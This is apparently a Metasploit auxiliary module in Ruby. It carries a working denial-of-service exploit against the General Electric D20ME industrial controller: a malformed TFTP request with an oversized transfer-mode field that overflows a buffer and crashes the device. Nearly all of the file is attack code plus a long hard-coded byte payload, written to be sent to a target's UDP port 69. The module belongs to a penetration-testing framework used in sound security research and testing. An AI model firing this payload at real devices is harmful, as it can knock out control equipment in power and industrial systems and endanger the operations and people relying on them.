##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

##
# The General Electric D20 (and possibly other devices) have numerous
# buffer overruns in their TFTP servers and probably other servers.
# There are many buffer overruns like it, but this one is the D20's
# TFTP Server transfer-mode overflow.
# The filename also suffers from an overrun but seems unlikely to be
# exploitable.
##


require 'msf/core'
require 'rex/ui/text/shell'
require 'rex/proto/tftp'

class Metasploit < Msf::Auxiliary
  include Rex::Ui::Text
  include Rex::Proto::TFTP
  include Msf::Exploit::Remote::Udp
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'General Electric D20ME TFTP Server Buffer Overflow DoS',
      'Description'    => %q{
        By sending a malformed TFTP request to the GE D20ME, it is possible to crash the
        device.

        This module is based on the original 'd20ftpbo.rb' Basecamp module from
        DigitalBond.
        },
      'Author'         =>
        [
          'K. Reid Wightman <wightman[at]digitalbond.com>', # original module
          'todb' # Metasploit fixups
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://www.digitalbond.com/tools/basecamp/metasploit-modules/' ]
        ],
      'DisclosureDate' => 'Jan 19 2012'
      ))

    register_options(
      [
        OptAddress.new('LHOST', [false, "The local IP address to bind to"]),
        OptInt.new('RECV_TIMEOUT', [false, "Time (in seconds) to wait between packets", 3]),
        Opt::RPORT(69)
      ], self.class)
  end

  def run
    udp_sock = Rex::Socket::Udp.create(
      'LocalHost' => datastore['LHOST'] || nil,
      'PeerHost'  => rhost,
      'PeerPort' => rport,
      'Context' => {'Msf' => framework, 'MsfExploit' => self}
    ) # No need to rescue, it's a UDP faux-socket
    udp_sock.sendto(payload, rhost, rport)
    recv = udp_sock.timed_read(65535, recv_timeout)
    if recv and recv.size > 0
      udp_sock.sendto(payload, rhost, rport)
    else
      print_error "#{rhost}:#{rport} - TFTP - No response from the target, aborting."
      return
    end
    print_good "#{rhost}:#{rport} - TFTP - DoS complete, the D20 should fault after a timeout."
  end

  def recv_timeout
    if datastore['RECV_TIMEOUT'].to_i.zero?
      3
    else
      datastore['RECV_TIMEOUT'].to_i.abs
    end
  end

  def payload
    "\x00\x01NVRAM\\D20.zlb\x00netascii" +
      "\x80\x80\x80\x80\x80\x80\x80\x81\x80\x80\x80\x82\x80\x80\x80\x83" +
      "\x80\x80\x80\x84\x80\x80\x80\x85\x80\x80\x80\x86\x80\x80\x80\x87\x80\x80\x80\x88" +
      "\x80\x80\x80\x89\x80\x80\x80\x8A\x80\x80\x80\x8B\x80\x80\x80\x8C\x80\x80\x80\x8D" +
      "\x80\x80\x80\x8E\x80\x80\x80\x8F\x80\x80\x80\x90\x80\x80\x80\x91\x80\x80\x80\x92" +
      "\x80\x80\x80\x93\x80\x80\x80\x94\x80\x80\x80\x95\x80\x80\x80\x96\x80\x80\x80\x97" +
      "\x80\x80\x80\x98\x80\x80\x80\x99\x80\x80\x80\x9A\x80\x80\x80\x9B\x80\x80\x80\x9C" +
      "\x80\x80\x80\x9D\x80\x80\x80\x9E\x80\x80\x80\x9F\x80\x80\x80\xA0\x80\x80\x80\xA1" +
      "\x80\x80\x80\xA2\x80\x80\x80\xA3\x80\x80\x80\xA4\x80\x80\x80\xA5\x80\x80\x80\xA6" +
      "\x80\x80\x80\xA7\x80\x80\x80\xA8\x80\x80\x80\x00\x80\x80\x80\xAA\x80\x80\x80\xAB" +
      "\x80\x80\x80\xAC\x80\x80\x80\xAD\x80\x80\x80\xAE\x80\x80\x80\xAF\x80\x80\x80\xB0" +
      "\x80\x80\x80\xB1\x80\x80\x80\xB2\x80\x80\x80\xB3\x80\x80\x80\xB4\x80\x80\x80\xB5" +
      "\x80\x80\x80\xB6\x80\x80\x80\xB7\x80\x80\x80\xB8\x80\x80\x80\xB9\x80\x80\x80\xBA" +
      "\x80\x80\x80\xBB\x80\x80\x80\xBC\x80\x80\x80\xBD\x80\x80\x80\xBE\x80\x80\x80\xBF" +
      "\x80\x80\x80\xC0\x80\x80\x80\xC1\x80\x80\x80\xC2\x80\x80\x80\xC3\x80\x80\x80\xC4" +
      "\x80\x80\x80\xC5\x80\x80\x80\xC6\x80\x80\x80\xC7\x80\x80\x80\xC8\x80\x80\x80\xC9" +
      "\x80\x80\x80\xCA\x80\x80\x80\xCB\x80\x80\x80\xCC\x80\x80\x80\xCD\x80\x80\x80\xCE" +
      "\x80\x80\x80\xCF\x80\x80\x80\xD0\x80\x80\x80\xD1\x80\x80\x80\xD2\x80\x80\x80\xD3" +
      "\x80\x80\x80\xD4\x80\x80\x80\xD5\x80\x80\x80\xD6\x80\x80\x80\xD7\x80\x80\x80\xD8" +
      "\x80\x80\x80\xD9\x80\x80\x80\xDA\x80\x80\x80\xDB\x80\x80\x80\xDC\x80\x80\x80\xDD" +
      "\x80\x80\x80\xDE\x80\x80\x80\x00\x00\x00\x80\x00\x00\x01\x80\xE1\x80\x80\x80\xE2" +
      "\x80\x80\x80\xE3\x80\x80\x80\xE4\x80\x80\x80\xE5\x80\x80\x80\xE6\x80\x80\x80\xE7" +
      "\x80\x80\x80\xE8\x80\x80\x80\xE9\x80\x80\x80\xEA\x80\x80\x80\xEB\x80\x80\x80\xEC" +
      "\x80\x80\x00\x80\x00\x00\x00\x7F\xFF\xBC\x80\xEF\x80\x80\x80\xF0\x80\x80\x80\xF1" +
      "\x80\x80\x80\xF2\x80\x80\x80\xF3\x80\x80\x80\xF4\x80\x80\x80\xF5\x80\x80\x80\xF6" +
      "\x80\x80\x80\xF7\x80\x80\x80\xF8\x80\x80\x80\xF9\x80\x80\x80\xFA\x80\x80\x80\xFB" +
      "\x80\x80\x80\xFC\x80\x80\x80\xFD\x80\x80\x80\xFE\x80\x80\x81\x80\x80\x80\x81\x81" +
      "\x80\x80\x81\x82\x80\x80\x81\x83\x80\x80\x81\x84\x80\x80\x81\x85\x80\x80\x81\x86" +
      "\x80\x80\x81\x87\x80\x80\x81\x88\x80\x80\x81\x89\x80\x80\x81\x8A\x80\x80\x81\x8B" +
      "\x80\x80\x81\x8C\x80\x80\x81\x8D\x80\x80\x81\x8E\x80\x80\x81\x8F\x80\x80\x81\x90" +
      "\x80\x80\x81\x91\x80\x80\x81\x92\x80\x80\x81\x93\x80\x80\x81\x94\x80\x80\x81\x95" +
      "\x80\x80\x81\x96\x80\x80\x81\x97\x80\x80\x81\x98\x80\x80\x81\x99\x80\x80\x81\x9A" +
      "\x80\x80\x81\x9B\x80\x80\x81\x9C\x80\x80\x81\x9D\x80\x80\x81\x9E\x80\x80\x81\x9F" +
      "\x80\x80\x81\xA0\x80\x80\x81\xA1\x80\x80\x81\xA2\x80\x80\x81\xA3\x80\x80\x81\xA4" +
      "\x80\x80\x81\xA5\x80\x80\x81\xA6\x80\x80\x81\xA7\x80\x80\x81\xA8\x80\x80\x81\xA9" +
      "\x80\x80\x81\xAA\x80\x80\x81\xAB\x80\x80\x81\xAC\x80\x80\x81\xAD\x80\x80\x81\xAE" +
      "\x80\x80\x81\xAF\x80\x80\x81\xB0\x80\x80\x81\xB1\x80\x80\x81\xB2\x80\x80\x81\xB3" +
      "\x80\x80\x81\xB4\x80\x80\x81\xB5\x80\x80\x81\xB6\x80\x80\x81\xB7\x80\x80\x81\xB8" +
      "\x80\x80\x81\xB9\x80\x80\x81\xBA\x80\x80\x81\xBB\x80\x80\x81\xBC\x80\x80\x81\xBD" +
      "\x80\x80\x81\xBE\x80\x80\x81\xBF\x80\x80\x81\xC0\x80\x80\x81\xC1\x80\x80\x81\xC2" +
      "\x80\x80\x81\xC3\x80\x80\x81\xC4\x80\x80\x81\xC5\x80\x80\x81\xC6\x80\x80\x81\xC7" +
      "\x80\x80\x81\xC8\x80\x80\x81\xC9\x80\x80\x81\xCA\x80\x80\x81\xCB\x80\x80\x81\xCC" +
      "\x80\x80\x81\xCD\x80\x80\x81\xCE\x80\x80\x81\xCF\x80\x80\x81\xD0\x80\x80\x81\xD1" +
      "\x80\x80\x81\xD2\x80\x80\x81\xD3\x80\x80\x81\xD4\x80\x80\x81\xD5\x80\x80\x81\xD6" +
      "\x80\x80\x81\xD7\x80\x80\x81\xD8\x80\x80\x81\xD9\x80\x80\x81\xDA\x80\x80\x81\xDB" +
      "\x80\x80\x81\xDC\x80\x80\x81\xDD\x80\x80\x81\xDE\x80\x80\x81\xDF\x80\x80\x81\xE0" +
      "\x80\x80\x81\xE1\x80\x80\x81\xE2\x80\x80\x81\xE3\x80\x80\x81\xE4\x80\x80\x81\xE5" +
      "\x80\x80\x81\xE6\x80\x80\x81\xE7\x80\x80\x81\xE8\x80\x80\x81\xE9\x80\x80\x81\xEA" +
      "\x80\x80\x81\xEB\x80\x80\x81\xEC\x80\x80\x81\xED\x80\x80\x81\xEE\x80\x80\x81\xEF" +
      "\x80\x80\x81\xF0\x80\x80\x81\xF1\x80\x80\x81\xF2\x80\x80\x81\xF3\x80\x80\x81\xF4" +
      "\x80\x80\x81\xF5\x80\x80\x81\xF6\x80\x80\x81\xF7\x80\x80\x81\xF8\x80\x80\x81\xF9" +
      "\x80\x80\x81\xFA\x80\x80\x81\xFB\x80\x80\x81\xFC\x80\x80\x81\xFD\x80\x80\x81\xFE" +
      "\x80\x80\x82\x80\x80\x80\x82\x81"
  end

end
